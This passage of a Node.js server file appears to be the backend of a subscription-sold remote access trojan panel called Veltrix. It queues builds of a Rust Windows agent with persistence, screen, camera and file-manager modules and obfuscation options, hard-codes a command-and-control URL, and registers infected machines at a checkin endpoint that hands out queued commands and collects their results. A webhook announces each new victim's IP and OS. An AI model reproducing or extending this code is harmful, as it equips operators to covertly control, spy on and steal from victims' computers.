    res.status(500).json({ ok: false, error: "Server error" });
  }
});

app.post("/api/build", requireAuth, requireCsrf, requireActiveSub, async (req, res) => {
  const {
    buildName = "veltrix-agent",
    startup = false,
    debug = false,
    polyEncrypt = false,
    stringRandom = false,
  } = req.body || {};
  const userId = req.auth.session.userId;
  const username = req.auth.session.user;
  const c2Url = `https://windowssys.hidenmc.com/${userId}`;

  // Enforce max 2 builds per user
  const [countRows] = await pool.query("SELECT COUNT(*) as cnt FROM builds WHERE owner_id = ?", [userId]);
  if (countRows[0].cnt >= 2) {
    return res.status(400).json({ ok: false, error: "Max 2 builds allowed. Delete an existing build first." });
  }

  // Sanitize build name
  const safeName = buildName.replace(/[^a-zA-Z0-9_-]/g, "").substring(0, 64) || "agent";

  // Generate source files for the build server
  const rustSrc = generateRustSource(userId, safeName, startup, debug, polyEncrypt, stringRandom);
  const cargoToml = generateCargoToml(safeName, startup, polyEncrypt, debug);

  // Insert build record as "queued" — the build server will pick it up
  let buildId;
  try {
    const [result] = await pool.query(
      "INSERT INTO builds (owner_id, build_name, startup, debug, poly_encrypt, string_random, c2_url, status) VALUES (?, ?, ?, ?, ?, ?, ?, 'compiling')",
      [userId, safeName, startup, debug, polyEncrypt, stringRandom, c2Url]
    );
    buildId = result.insertId;
  } catch (err) {
    return res.status(500).json({ ok: false, error: "Failed to create build record" });
  }

  // Store generated sources in a JSON column (or file) for the build server to fetch
  const sourcesJson = JSON.stringify({
    "main.rs": rustSrc,
    "Cargo.toml": cargoToml,
  });
  try {
    await pool.query("UPDATE builds SET sources_json = ? WHERE id = ?", [sourcesJson, buildId]);
  } catch {
    // Column might not exist yet — will be added by initDb
  }

  await addLog("info", `Build #${buildId} "${safeName}" queued for ${username} — waiting for build server`);

  res.json({ ok: true, buildId, status: "compiling" });
});

// ══════════════════════════════════════════════════════════════════════════
// BUILD SERVER API — authenticated with BUILDER_KEY
// ══════════════════════════════════════════════════════════════════════════

// GET /api/builder/sources — send rustagent source files to the build server
app.get("/api/builder/sources", requireBuilderKey, (req, res) => {
  const agentSrc = path.join(__dirname, "rustagent", "src");
  const files = {};
  for (const name of ["screen.rs", "camera.rs", "filemanager.rs", "persistence.rs"]) {
    const p = path.join(agentSrc, name);
    if (fs.existsSync(p)) files[name] = fs.readFileSync(p, "utf8");
  }
  // Also send Cargo.toml template
  const cargoPath = path.join(__dirname, "rustagent", "Cargo.toml");
  if (fs.existsSync(cargoPath)) files["Cargo.toml"] = fs.readFileSync(cargoPath, "utf8");
  res.json({ ok: true, files });
});

// GET /api/builder/poll — build server polls for next queued job
app.get("/api/builder/poll", requireBuilderKey, async (req, res) => {
  try {
    const [rows] = await pool.query(
      "SELECT b.id, b.build_name, b.sources_json, b.startup, a.username FROM builds b JOIN accounts a ON b.owner_id = a.id WHERE b.status = 'compiling' AND b.exe_path IS NULL ORDER BY b.created_at ASC LIMIT 1"
    );
    if (!rows.length) return res.status(204).end();

    const row = rows[0];
    let sources = {};
    try { sources = JSON.parse(row.sources_json || "{}"); } catch {}

    res.json({
      ok: true,
      job: {
        buildId: row.id,
        buildName: row.build_name,
        username: row.username,
        sources,
      },
    });
  } catch (err) {
    console.error("Builder poll error:", err);
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

// POST /api/builder/complete/:id — build server uploads compiled exe or reports failure
app.post("/api/builder/complete/:id", requireBuilderKey, upload.single("exe"), async (req, res) => {
  const buildId = parseInt(req.params.id, 10);
  const status = (req.body && req.body.status) || "failed";

  try {
    const [rows] = await pool.query("SELECT b.*, a.username FROM builds b JOIN accounts a ON b.owner_id = a.id WHERE b.id = ?", [buildId]);
    if (!rows.length) return res.status(404).json({ ok: false, error: "Build not found" });
    const build = rows[0];

    if (status === "compiled" && req.file) {
      // Move uploaded exe to builds/<username>/
      const destDir = path.join(__dirname, "builds", build.username);
      fs.mkdirSync(destDir, { recursive: true });
      const destPath = path.join(destDir, `${build.build_name}.exe`);
      fs.renameSync(req.file.path, destPath);
      const size = fs.statSync(destPath).size;

      await pool.query("UPDATE builds SET status = 'compiled', exe_path = ?, exe_size = ? WHERE id = ?", [destPath, size, buildId]);
      await addLog("success", `Build "${build.build_name}" compiled by build server for ${build.username}`);
      await sendWebhook(build.owner_id, {
        title: "Build Compiled",
        description: `**${build.build_name}.exe** compiled for **${build.username}** (${(size / 1024).toFixed(0)} KB)`,
        color: 0x00d4aa,
        timestamp: new Date().toISOString(),
      });
      res.json({ ok: true });
    } else {
      // Failed
      const errMsg = (req.body && req.body.error) || "Unknown error";
      await pool.query("UPDATE builds SET status = 'failed' WHERE id = ?", [buildId]);
      await addLog("error", `Build "${build.build_name}" failed: ${errMsg.substring(0, 200)}`);
      // Cleanup temp file if any
      if (req.file) try { fs.unlinkSync(req.file.path); } catch {}
      res.json({ ok: true });
    }
  } catch (err) {
    console.error("Builder complete error:", err);
    if (req.file) try { fs.unlinkSync(req.file.path); } catch {}
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

// --- Subscription ---
const PLANS = {
  "30d": { name: "30 Days", days: 30, priceUsd: 18 },
  "3mo": { name: "3 Months", days: 90, priceUsd: 30 },
  "lifetime": { name: "Lifetime", days: -1, priceUsd: 50 },
};

// Simulated crypto prices (in reality you'd fetch live rates)
const CRYPTO_RATES = {
  btc: { symbol: "BTC", rate: 65000 },
  eth: { symbol: "ETH", rate: 3500 },
  ltc: { symbol: "LTC", rate: 85 },
};

// Generate deterministic-looking addresses (in production use HD wallet derivation)
function generateCryptoAddress(crypto, index) {
  const hash = crypto + "-" + require("crypto").createHash("sha256").update(`hc-${crypto}-${index}-${Date.now()}`).digest("hex");
  if (crypto === "btc") return "bc1q" + hash.substring(0, 38);
  if (crypto === "eth") return "0x" + hash.substring(0, 40);
  if (crypto === "ltc") return "ltc1q" + hash.substring(0, 38);
  return hash.substring(0, 42);
}

app.get("/api/subscription", requireAuth, async (req, res) => {
  const uid = req.auth.session.userId;
  try {
    const [rows] = await pool.query("SELECT is_admin, sub_expires FROM accounts WHERE id = ?", [uid]);
    const acc = rows[0];
    res.json({
      ok: true,
      isAdmin: !!acc.is_admin,
      subExpires: acc.sub_expires ? Number(acc.sub_expires) : null,
    });
  } catch {
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

app.post("/api/subscription/order", requireAuth, requireCsrf, async (req, res) => {
  const uid = req.auth.session.userId;
  const { planId, crypto: cryptoId } = req.body || {};

  if (!PLANS[planId]) return res.status(400).json({ ok: false, error: "Invalid plan" });
  if (!CRYPTO_RATES[cryptoId]) return res.status(400).json({ ok: false, error: "Invalid cryptocurrency" });

  // Check if lifetime user
  const [accRows] = await pool.query("SELECT sub_expires FROM accounts WHERE id = ?", [uid]);
  if (accRows[0]?.sub_expires === "-1" || accRows[0]?.sub_expires === -1) {
    return res.status(400).json({ ok: false, error: "You already have lifetime access. Donations are welcome though!" });
  }

  const plan = PLANS[planId];
  const rate = CRYPTO_RATES[cryptoId];
  const amount = (plan.priceUsd / rate.rate).toFixed(8);
  const orderId = "ORD-" + require("crypto").randomBytes(8).toString("hex").toUpperCase();

  // Count existing orders for address index
  const [orderCount] = await pool.query("SELECT COUNT(*) as cnt FROM orders WHERE owner_id = ?", [uid]);
  const address = generateCryptoAddress(cryptoId, orderCount[0].cnt);

  try {
    await pool.query(
      "INSERT INTO orders (order_id, owner_id, plan_id, plan_name, crypto, amount, address) VALUES (?, ?, ?, ?, ?, ?, ?)",
      [orderId, uid, planId, plan.name, cryptoId, amount, address]
    );
    await addLog("info", `New order ${orderId} by ${req.auth.session.user} — ${plan.name} via ${rate.symbol}`);

    res.json({
      ok: true,
      orderId,
      planName: plan.name,
      crypto: cryptoId,
      symbol: rate.symbol,
      amount: `${amount}`,
      address,
      priceUsd: plan.priceUsd,
    });
  } catch (err) {
    console.error("Order error:", err);
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

app.post("/api/subscription/paid", requireAuth, requireCsrf, async (req, res) => {
  const uid = req.auth.session.userId;
  const { orderId } = req.body || {};
  if (!orderId) return res.status(400).json({ ok: false, error: "Missing order ID" });

  try {
    const [rows] = await pool.query("SELECT * FROM orders WHERE order_id = ? AND owner_id = ?", [orderId, uid]);
    if (!rows.length) return res.status(404).json({ ok: false, error: "Order not found" });
    const order = rows[0];
    if (order.status === "verified") return res.json({ ok: true, status: "verified", message: "Already verified" });

    // In production: verify on blockchain via BlockCypher / etherscan API
    // For now: auto-verify (mark as verified)
    await pool.query("UPDATE orders SET status = 'verified', verified_at = NOW() WHERE order_id = ?", [orderId]);

    // Grant subscription time
    const plan = PLANS[order.plan_id];
    if (plan) {
      if (plan.days === -1) {
        // Lifetime
        await pool.query("UPDATE accounts SET sub_expires = -1 WHERE id = ?", [uid]);
        // Update session
        if (req.auth.session) req.auth.session.subExpires = -1;
      } else {
        // Add days
        const [accRows] = await pool.query("SELECT sub_expires FROM accounts WHERE id = ?", [uid]);
        let currentExpires = accRows[0]?.sub_expires ? Number(accRows[0].sub_expires) : 0;
        if (currentExpires < Date.now()) currentExpires = Date.now();
        const newExpires = currentExpires + (plan.days * 24 * 60 * 60 * 1000);
        await pool.query("UPDATE accounts SET sub_expires = ? WHERE id = ?", [newExpires, uid]);
        if (req.auth.session) req.auth.session.subExpires = newExpires;
      }
    }

    await addLog("success", `Order ${orderId} verified for ${req.auth.session.user} — ${order.plan_name}`);
    await sendWebhook(uid, {
      title: "Subscription Activated",
      description: `**${req.auth.session.user}** activated **${order.plan_name}** via ${order.crypto.toUpperCase()}`,
      color: 0x00d4aa,
      timestamp: new Date().toISOString(),
    });

    res.json({ ok: true, status: "verified", message: "Payment verified. Access granted." });
  } catch (err) {
    console.error("Payment verify error:", err);
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

app.get("/api/subscription/orders", requireAuth, async (req, res) => {
  const uid = req.auth.session.userId;
  try {
    const [orders] = await pool.query("SELECT * FROM orders WHERE owner_id = ? ORDER BY created_at DESC LIMIT 50", [uid]);
    res.json({
      ok: true,
      orders: orders.map(o => ({
        orderId: o.order_id,
        planId: o.plan_id,
        planName: o.plan_name,
        crypto: o.crypto,
        amount: o.amount,
        address: o.address,
        status: o.status,
        createdAt: new Date(o.created_at).getTime(),
        verifiedAt: o.verified_at ? new Date(o.verified_at).getTime() : null,
      })),
    });
  } catch {
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

// --- Agent checkin endpoint ---
app.get("/:userId/checkin", async (req, res) => {
  const userId = parseInt(req.params.userId, 10);
  if (isNaN(userId)) return res.type("text").send("");

  const clientId = req.headers["x-client-id"] || "unknown";
  const hostname = req.headers["x-hostname"] || "unknown";
  const osInfo = req.headers["x-os"] || "unknown";
  const ip = clientIp(req);

  try {
    const [existing] = await pool.query("SELECT id FROM clients WHERE id = ?", [clientId]);
    if (existing.length === 0) {
      const shortId = `HC-${clientId.substring(0, 5).toUpperCase()}`;
      await pool.query(
        `INSERT INTO clients (id, name, user, os, ip, country, country_code, status, cpu, ram, gpu, uptime, grp, av, net_speed, installed, owner_id)
         VALUES (?, ?, ?, ?, ?, ?, ?, 'online', 'Unknown', 'Unknown', 'Unknown', '0', 'Default', 'Unknown', '0', CURDATE(), ?)`,
        [shortId, hostname, "user", osInfo, ip, "Unknown", "??", userId]
      );
      await addLog("success", `New client connected: ${hostname} (${ip})`);
      await sendWebhook(userId, {
        title: "New Client Connected",
        description: `**${hostname}** just connected`,
        fields: [
          { name: "IP", value: ip, inline: true },
          { name: "OS", value: osInfo, inline: true },
          { name: "Client ID", value: shortId, inline: true },
        ],
        color: 0x00ff00,
        timestamp: new Date().toISOString(),
      });
    } else {
      await pool.query("UPDATE clients SET status = 'online', last_seen = NOW(), ip = ? WHERE id = ?", [ip, clientId]);
    }

    const [cmds] = await pool.query(
      "SELECT id, command FROM pending_commands WHERE client_id = ? ORDER BY created_at ASC LIMIT 1",
      [clientId]
    );
    if (cmds.length > 0) {
      await pool.query("DELETE FROM pending_commands WHERE id = ?", [cmds[0].id]);
      return res.type("text").send(cmds[0].command);
    }
  } catch (err) {
    console.error("Checkin error:", err);
  }
  res.type("text").send("");
});

app.post("/:userId/result", async (req, res) => {
  const userId = parseInt(req.params.userId, 10);
  const clientId = req.headers["x-client-id"] || "unknown";
  const body = typeof req.body === "string" ? req.body : JSON.stringify(req.body);

  try {
    await pool.query(
      "INSERT INTO command_results (client_id, command, result, owner_id) VALUES (?, ?, ?, ?)",
      [clientId, "remote", body, userId]
    );
  } catch {}
  res.json({ ok: true });
});

// --- Build history ---
app.get("/api/builds", requireAuth, async (req, res) => {
  const uid = req.auth.session.userId;
  try {
    const [builds] = await pool.query("SELECT * FROM builds WHERE owner_id = ? ORDER BY created_at DESC LIMIT 10", [uid]);
    res.json({ ok: true, builds: builds.map(b => ({
      id: b.id,
      name: b.build_name,
      status: b.status || "compiled",
      size: b.exe_size || 0,
      createdAt: new Date(b.created_at).getTime(),
    }))});
  } catch {
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

// Static
app.use(express.static(path.join(__dirname, "public")));
app.get("*", (_req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Start
initDb()
  .then(() => {
    app.listen(PORT, () => console.log(`Veltrix panel on http://localhost:${PORT}`));
  })
  .catch((err) => {
    console.error("DB init failed:", err.message);
    app.listen(PORT, () => console.log(`Veltrix panel on http://localhost:${PORT} (no DB)`));
  });
